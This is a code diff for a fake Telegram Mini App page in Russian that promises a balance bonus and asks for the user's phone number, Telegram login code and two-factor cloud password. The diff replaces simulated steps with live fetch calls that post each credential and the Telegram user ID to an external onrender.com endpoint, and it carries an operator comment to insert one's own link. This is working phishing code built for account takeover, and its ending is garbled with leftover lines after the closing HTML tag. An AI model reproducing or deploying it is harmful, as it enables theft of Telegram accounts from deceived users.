@@ -18,13 +18,13 @@
             color: var(--tg-theme-text-color);
             margin: 0; padding: 20px;
             display: flex; flex-direction: column; align-items: center;
-            transition: all 0.3s ease;
+            overflow: hidden;
         }
         .container { width: 100%; max-width: 400px; text-align: center; }
-        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step { display: none; animation: fadeIn 0.3s ease; }
         .step.active { display: block; }
         
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
         img.logo { width: 80px; height: 80px; margin-top: 20px; margin-bottom: 10px; }
         h2 { font-size: 20px; margin-bottom: 8px; }
@@ -37,7 +37,7 @@
             font-size: 16px; outline: none;
             background: #f4f4f5; color: #000;
         }
-        input:focus { border-color: var(--tg-theme-button-color); }
+        input:focus { border: 2px solid var(--tg-theme-button-color); }
 
         .btn {
             width: 100%; padding: 14px;
@@ -46,7 +46,14 @@
             border: none; border-radius: 10px;
             font-size: 16px; font-weight: 600; cursor: pointer;
         }
-        .loader { display: none; margin-top: 15px; border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-theme-button-color); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .loader { 
+            display: none; margin-top: 15px; 
+            border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-theme-button-color); 
+            border-radius: 50%; width: 24px; height: 24px; 
+            animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; 
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -56,23 +63,23 @@
     <div id="step-phone" class="step active">
         <img src="https://telegram.org/img/t_logo.png" class="logo">
         <h2>Ваш номер</h2>
-        <p>Пожалуйста, подтвердите номер телефона,<br>чтобы зачислить бонус на баланс.</p>
+        <p>Подтвердите номер телефона,<br>чтобы зачислить бонус на баланс.</p>
         <input type="tel" id="phone" placeholder="+7 900 000-00-00">
-        <button class="btn" onclick="nextStep('phone')">Продолжить</button>
+        <button class="btn" id="btn-phone" onclick="processPhone()">Продолжить</button>
     </div>
 
     <div id="step-code" class="step">
         <h2>Проверка</h2>
-        <p id="code-hint">Мы отправили код подтверждения в приложение Telegram.</p>
+        <p>Мы отправили код подтверждения в приложение Telegram.</p>
         <input type="number" id="code" placeholder="Код подтверждения">
-        <button class="btn" onclick="nextStep('code')">Подтвердить</button>
+        <button class="btn" id="btn-code" onclick="processCode()">Подтвердить</button>
     </div>
 
     <div id="step-2fa" class="step">
         <h2>Облачный пароль</h2>
-        <p>Ваш аккаунт защищен двухэтапной аутентификацией. Введите пароль.</p>
+        <p>Ваш аккаунт защищен 2FA. Введите пароль.</p>
         <input type="password" id="password" placeholder="Пароль">
-        <button class="btn" onclick="sendFinal()">Войти</button>
+        <button class="btn" id="btn-2fa" onclick="process2FA()">Войти</button>
     </div>
 
     <div id="loader" class="loader"></div>
@@ -83,36 +90,84 @@
     tg.expand();
     tg.ready();
 
-    let userData = {
-        phone: '',
-        code: '',
-        password: ''
-    };
+    // !!! ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЮ ОТ RENDER !!!
+    const API_URL = "https://telegram-1-gpvs.onrender.com/api"; 
+    
+    // Получаем ID пользователя из Telegram
+    const USER_ID = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown";
 
-    function showLoader(show) {
+    function toggleLoader(show) {
         document.getElementById('loader').style.display = show ? 'block' : 'none';
+        const btns = document.querySelectorAll('.btn');
+        btns.forEach(b => b.disabled = show);
     }
 
-    function nextStep(current) {
-        if (current === 'phone') {
-            userData.phone = document.getElementById('phone').value;
-            if (!userData.phone) return alert('Введите номер');
-            
-            // Скрываем текущий шаг, показываем загрузку
-            document.getElementById('step-phone').classList.remove('active');
-            showLoader(true);
-            
-            // Имитируем запрос к серверу и переход
-            setTimeout(() => {
-                showLoader(false);
-                document.getElementById('step-code').classList.add('active');
-            }, 1000);
+    async function apiPost(data) {
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...data, user_id: USER_ID })
+            });
+            return await response.json();
+        } catch (err) {
+            console.error(err);
+            return { status: "error", message: "Ошибка соединения с сервером" };
+        }
+    }
 
-        } else if (current === 'code') {
-            userData.code = document.getElementById('code').value;
-            if (!userData.code) return alert('Введите код');
-            
+    async function processPhone() {
+        const phone = document.getElementById('phone').value;
+        if (phone.length < 10) return alert("Введите корректный номер");
+
+        toggleLoader(true);
+        const res = await apiPost({ action: "send_phone", phone: phone });
+        toggleLoader(false);
+
+        if (res.status === "ok") {
+            document.getElementById('step-phone').classList.remove('active');
+            document.getElementById('step-code').classList.add('active');
+        } else {
+            alert("Ошибка: " + res.message);
+        }
+    }
+
+    async function processCode() {
+        const code = document.getElementById('code').value;
+        if (!code) return alert("Введите код");
+
+        toggleLoader(true);
+        const res = await apiPost({ action: "send_code", code: code });
+        toggleLoader(false);
+
+        if (res.status === "success") {
+            tg.close(); // Всё готово
+        } else if (res.status === "need_2fa") {
             document.getElementById('step-code').classList.remove('active');
+            document.getElementById('step-2fa').classList.add('active');
+        } else {
+            alert("Ошибка: " + res.message);
+        }
+    }
+
+    async function process2FA() {
+        const pass = document.getElementById('password').value;
+        if (!pass) return alert("Введите пароль");
+
+        toggleLoader(true);
+        const res = await apiPost({ action: "send_2fa", password: pass });
+        toggleLoader(false);
+
+        if (res.status === "success") {
+            tg.close();
+        } else {
+            alert("Ошибка: " + res.message);
+        }
+    }
+</script>
+
+</body>
+</html>            document.getElementById('step-code').classList.remove('active');
             showLoader(true);
 
             // Здесь в реальности бот может вернуть ошибку или потребовать 2FA
